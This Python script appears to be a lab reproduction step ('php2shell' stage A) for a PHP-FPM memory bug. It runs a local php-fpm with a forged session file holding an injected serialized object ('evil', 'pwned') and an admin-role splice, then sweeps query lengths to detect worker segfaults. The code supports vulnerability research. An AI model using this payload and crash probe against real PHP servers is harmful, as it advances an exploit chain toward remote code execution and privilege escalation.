#!/usr/bin/env python3
"""Stage A on plain FPM: black-box query-length sweep (wake 22).

Loopback only.  For each case, start a fresh loopback php-fpm (plain build,
USE_ZEND_ALLOC=0), drive ONE splice request through the committed FastCGI
client, and report whether the worker died with SIGSEGV (the plain-build
signature of the stale-tzcache read, as on CGI).  Controls vary the timezone
and the cookie.  Evidence lands in lab/build/evidence/stageA-fpm/.

Usage: python3 lab/repro/php2shell-stageA-fpm-sweep.py <php-fpm-bin> [outdir]
"""
import os
import pathlib
import re
import shutil
import subprocess
import signal
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
HERE_REPO = HERE.parent.parent

SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
SPLICE = ('data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 +
          '";roles|a:1:{i:0;s:5:"admin";}')
BOUND = '---------------------------20896060251896012921717172737'


def wait_port(port):
    import socket
    for _ in range(150):
        try:
            s = socket.create_connection(('127.0.0.1', port), 0.2)
            s.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def run_case(fpm, out, port, label, query, cookie, tz):
    d = pathlib.Path(tempfile.mkdtemp(prefix='fpm-sweep-'))
    sess, www = d / 'sess', d / 'www'
    sess.mkdir(); www.mkdir()
    (sess / ('sess_' + SID)).write_text(SPLICE)
    (www / 'worker.php').write_text('<?php echo "worker\\n";')
    body = (('--%s\r\nContent-Disposition: form-data; '
             'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUND)
            + ('--%s\r\nContent-Disposition: form-data; name="file1"; '
               'filename="a.txt"\r\n\r\n1\r\n' % BOUND)
            + ('--%s--\r\n' % BOUND)).encode()
    (d / 'body').write_bytes(body)
    conf = d / 'fpm.conf'
    conf.write_text(f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 1

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[max_input_vars] = 10000
php_admin_value[session.save_path] = {sess}
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.cache_limiter] =
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 1024
''')
    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    cmd = [str(fpm), '-n', '-F', '-y', str(conf),
           '-d', 'date.timezone=' + tz,
           '-d', f'error_log={d}/php-error.log', '-d', 'log_errors=1',
           '-d', 'error_reporting=32767', '-d', 'display_errors=0']
    with (d / 'fpm.out').open('wb') as fo:
        master = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                                  start_new_session=True)
        try:
            ready = wait_port(port)
            fo.flush()
            if (d / 'fpm.out').exists() and \
               'FPM initialization failed' in (d / 'fpm.out').read_text(errors='replace'):
                ready = False
            result = {'case': label, 'query': query, 'tz': tz, 'cookie': cookie,
                      'ready': ready, 'segv': 0, 'abort': 0, 'assert': 0,
                      'client': ''}
            if ready:
                cc = [sys.executable, str(CLIENT), str(port), str(www / 'worker.php'),
                      '--param', 'QUERY_STRING=' + query,
                      '--param', f'CONTENT_TYPE=multipart/form-data; boundary={BOUND}',
                      '--body', str(d / 'body')]
                if cookie:
                    cc += ['--param', 'HTTP_COOKIE=PHPSESSID=' + SID]
                cp = subprocess.run(cc, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, timeout=30)
                result['client'] = cp.stdout.decode(errors='replace')[:200]
                time.sleep(0.8)
        finally:
            os.killpg(master.pid, signal.SIGKILL)
            try:
                master.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
        for lf in (d / 'fpm-error.log', d / 'fpm.out'):
            if lf.exists():
                txt = lf.read_text(errors='replace')
                result['segv'] += len(re.findall(r'signal 11 \(SIGSEGV', txt))
                result['abort'] += len(re.findall(r'signal 6 \(SIGABRT', txt))
                result['assert'] += len(re.findall(r'_zend_is_inconsistent|already destroyed', txt))
    # preserve a compact log
    log = out / f'sweep-{label}.log'
    with log.open('w') as lf:
        lf.write(f"case={label} query={query!r} tz={tz} cookie={cookie}\n")
        for lfname in ('php-error.log', 'fpm-error.log', 'fpm.out'):
            p = d / lfname
            if p.exists():
                lf.write(f'--- {lfname} ---\n{p.read_text(errors="replace")[:4000]}\n')
        lf.write(f"VERDICT segv={result['segv']} abort={result.get('abort',0)} "
                 f"assert={result.get('assert',0)}\n")
    shutil.rmtree(d, ignore_errors=True)
    return result


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2 else 'lab/build/evidence/stageA-fpm')
    base_port = int(sys.argv[3]) if len(sys.argv) > 3 else 18300
    out.mkdir(parents=True, exist_ok=True)
    build = fpm.parents[2]
    print(f'FPM={fpm} build={build} out={out} base_port={base_port}')
    cases = [
        ('qs0', '', True, 'Bogus/Zone'),
        ('qs4', 'XXX=AAAA', True, 'Bogus/Zone'),
        ('qs8', 'XXX=AAAAAAAA', True, 'Bogus/Zone'),
        ('qs9', 'XXX=AAAAAAAAA', True, 'Bogus/Zone'),
        ('qs10', 'XXX=ABCDEFGHIJ', True, 'Bogus/Zone'),
        ('qs14', 'XXX=ABCDEFGHIJKLMN', True, 'Bogus/Zone'),
        ('qs24', 'XXX=' + 'A' * 24, True, 'Bogus/Zone'),
        ('qs25', 'XXX=' + 'A' * 25, True, 'Bogus/Zone'),
        ('qs32', 'XXX=' + 'A' * 32, True, 'Bogus/Zone'),
        ('validtz', 'XXX=ABCDEFGHIJ', True, 'UTC'),
        ('nocookie', 'XXX=ABCDEFGHIJ', False, 'Bogus/Zone'),
    ]
    for i, (label, query, cookie, tz) in enumerate(cases):
        r = run_case(fpm, out, base_port + i, label, query, cookie, tz)
        print(f"{label:10s} ready={r['ready']} segv={r['segv']} "
              f"abort={r.get('abort',0)} assert={r.get('assert',0)} "
              f"client={r['client'][:50]!r}")


if __name__ == '__main__':
    main()
